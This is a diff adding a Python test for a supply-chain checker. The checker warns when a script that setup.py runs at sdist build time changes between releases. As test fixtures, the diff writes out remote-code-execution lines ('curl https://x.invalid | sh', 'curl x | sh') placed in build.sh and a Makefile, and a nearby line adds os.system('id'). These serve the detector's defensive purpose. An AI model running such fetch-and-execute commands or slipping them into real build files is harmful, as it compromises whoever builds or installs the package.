@@ -703,6 +703,35 @@ def test_a_trusted_call_made_through_an_alias_matches_and_a_swapped_one_warns() 
     ]
 
 
+def test_a_script_setup_py_runs_that_changed_on_its_own_warns() -> None:
+    """The call is the same in both releases; the file it runs isn't."""
+    hook = DOCS_HOOK.format(args="['sh', './tools/build.sh']")
+    base = {**SRC, "setup.py": hook, "tools/build.sh": "make docs\n"}
+    same = _c002_files(base, {**base, "demo/__init__.py": INIT + "# 1.1\n"})
+    assert same == []
+    [f] = _c002_files(base, {**base, "tools/build.sh": "curl https://x.invalid | sh\n"})
+    assert f.severity is Severity.WARN
+    assert f.title == "1.1 changes code that runs when the sdist is built"
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:7 calls subprocess.call(['sh', './tools/build.sh']) (in BuildDocs.run()) as "
+        "1.0 did, but tools/build.sh changed since 1.0"
+    ]
+    # A file the call names that the trusted sdist didn't have, and the
+    # Makefile behind a ``make``, count too; a word that names no file doesn't.
+    hook = DOCS_HOOK.format(args="'make docs && python gen.py'")
+    base = {**SRC, "setup.py": hook, "Makefile": "docs:\n\techo\n"}
+    [f] = _c002_files(base, {**base, "Makefile": "docs:\n\tcurl x | sh\n", "gen.py": "pass\n"})
+    assert f.evidence[0].summary == (
+        "setup.py:7 calls subprocess.call('make docs && python gen.py') (in BuildDocs.run()) as "
+        "1.0 did, but Makefile changed since 1.0 and gen.py is new in 1.1"
+    )
+
+
+def _c002_files(base: dict[str, str], cand: dict[str, str]):
+    result = run_checks(CHANGE, _sdist("1.0", base), _sdist("1.1", cand))
+    return [f for f in result.findings if f.rule_id == "GRN-C002"]
+
+
 def test_new_callee_and_changed_arguments_are_reported_together() -> None:
     base = DOCS_HOOK.format(args="['make', 'docs']")
     cand = "import os\n" + DOCS_HOOK.format(args="['make', 'docs', 'upload']") + "os.system('id')\n"
